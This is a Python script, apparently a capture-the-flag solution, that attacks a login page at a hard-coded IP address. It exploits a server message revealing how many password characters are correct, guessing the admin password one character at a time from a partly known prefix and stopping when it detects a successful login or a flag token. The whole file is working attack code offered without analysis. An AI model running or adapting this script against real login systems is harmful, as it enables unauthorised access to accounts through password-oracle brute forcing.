import requests, re, time, argparse
from string import ascii_lowercase, ascii_uppercase, digits

BASE = "http://52.59.124.14:5015"
INDEX = "/index.php"
LOGIN = "/login.php"
USERNAME = "admin"
REGEX = re.compile(r"you got\s+(\d+)\s+characters?\s+correct", re.I)
CHARSET = ascii_lowercase + ascii_uppercase + digits

def probe(session, attempt):
    # POST password, then GET index
    try:
        session.post(BASE + LOGIN, data={"username": USERNAME, "password": attempt}, allow_redirects=False, timeout=8)
        r = session.get(BASE + INDEX, timeout=8)
    except Exception:
        return None

    # compare response to regex
    m = REGEX.search(r.text or "")
    if m:
        # amount of correct chars
        return int(m.group(1))

    # login success check
    for tok in ("dashboard", "logout", "welcome", "admin", "ENO{"):
        if tok in (r.text or "").lower():
            return -1
    return None

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--max", type=int, default=64) # In case of false positives 
    p.add_argument("--delay", type=float, default=0.03)
    args = p.parse_args()

    s = requests.Session()
    known = "YzUnh2ruQix9mBW"

    for pos in range(args.max):
        print(f"pos {pos}, known='{known}'")
        progressed = False
        for ch in CHARSET:
            guess = known + ch
            res = probe(s, guess)
            print(f"  try '{guess}'")
            if res == -1:
                print("login success:", guess)
                return
            if isinstance(res, int) and res == len(known) + 1:
                known += ch
                print("found char:", ch)
                progressed = True
                time.sleep(args.delay)
                break
        if not progressed:
            print("stuck. test known:", known)
            return
        
if __name__ == "__main__":
    main()